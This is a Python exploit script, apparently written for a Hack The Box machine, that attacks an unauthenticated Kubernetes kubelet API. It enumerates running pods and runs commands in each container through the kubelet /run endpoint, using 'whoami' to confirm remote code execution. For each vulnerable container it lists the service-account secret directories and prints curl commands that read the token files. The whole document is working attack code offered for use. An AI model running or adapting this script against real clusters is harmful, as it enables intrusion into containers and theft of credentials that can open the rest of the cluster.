import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
def getRunningPods(url):
    url = url + "/runningpods/"
    print("[*] Obtaining running pods...")
    runningpods = []
    try:
        r = requests.get(url, verify=False)
        res = r.json()
        for item in res['items']:
            data = {}
            podname = item['metadata']['name']
            namespace = item['metadata']['namespace']
            container = item['spec']['containers'][0]['name']
            print('[+] Found container: {container}'.format(container=container))
            print('    --> namespace: {namespace}'.format(namespace=namespace))
            print('    --> podname: {podname}'.format(podname=podname))
            data['podname'] = podname
            data['namespace'] = namespace
            data['container'] = container
            runningpods.append(data)
    except Exception as e:
        print("[!] An error occured! Exception: {e}".format(e=e))
    return runningpods


def checkRce(url, runningpods):
    print("[*] Testing containers for rce!")
    exploitable_urls = []
    for item in runningpods:
        exploiturl = ""
        namespace = item['namespace']
        podname  = item['podname']
        container = item['container']
        exploiturl = url + "/run/{namespace}/{podname}/{container}".format(namespace=namespace,podname=podname,container=container)
        data = {'cmd':'whoami'}
        r = requests.post(url=exploiturl, verify=False, data=data)
        output = r.text.strip()
        if ("exited" in output) or ("Error" in output):
            continue
        else:
            print("[+] {podname} vulnerable to rce!".format(podname=podname))
            exploit = 'curl -k -XPOST "{exploiturl}" -d "cmd=whoami"'.format(exploiturl=exploiturl)
            exploitable_urls.append(exploiturl)
            print("    --> Exploit: {exploit}".format(exploit=exploit))
    return exploitable_urls

def getSecrets(exploitable_urls, url):
    print("[*] Obtaining secrets from containers!")
    secrets_location = ["/run/secrets/kubernetes.io/serviceaccount","/var/run/secrets/kubernetes.io/serviceaccount","/secrets/kubernetes.io/serviceaccount"]
    for exploiturl in exploitable_urls:
        print("[+] Obtaining secrets for {exploiturl}".format(exploiturl=exploiturl))
        default_url = ""
        default_url = url + "/run/"
        filename = exploiturl.replace(default_url,"")
        filename = filename.replace("/","_")
        for location in secrets_location:
            command = "ls {location}".format(location=location)
            data = {'cmd': command}
            r = requests.post(url=exploiturl, verify=False, data=data)
            if "No such file or directory" in r.text:
                continue
            else:
                secretfiles = r.text.strip().split("\n")
                for secret in secretfiles:
                    command = "cat {location}/{secret}".format(location=location,secret=secret)
                    exploit = 'curl -k -XPOST "{exploiturl}" -d "cmd={command}"'.format(exploiturl=exploiturl, command=command)
                    print("    --> Obtain {secret}: {exploit}".format(secret=secret, exploit=exploit))
                break
        
def main(url):
    runningpods = getRunningPods(url)
    exploitable_urls = checkRce(url, runningpods)
    getSecrets(exploitable_urls,url)

if __name__ == '__main__':
    #url = "https://steamcloud.htb:10250"
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Exposed Kubernetes url')
    args = parser.parse_args()
    main(args.url)
